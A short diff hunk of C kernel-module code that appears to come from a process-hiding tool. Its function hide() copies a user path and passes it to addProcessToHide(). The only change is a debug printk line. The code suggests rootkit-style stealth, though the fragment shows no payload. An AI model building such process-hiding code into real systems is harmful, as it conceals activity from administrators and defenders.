@@ -45,7 +45,7 @@ int hide(const char __user *path) {
     kfree(tempPath);
     return result;
   }
-  printk("%p\n", tempPath);
+  printk("%p (%d bytes)\n", tempPath, result);
   //      printk("%s",tempPath);
   result = addProcessToHide(tempPath);
   kfree(_path);
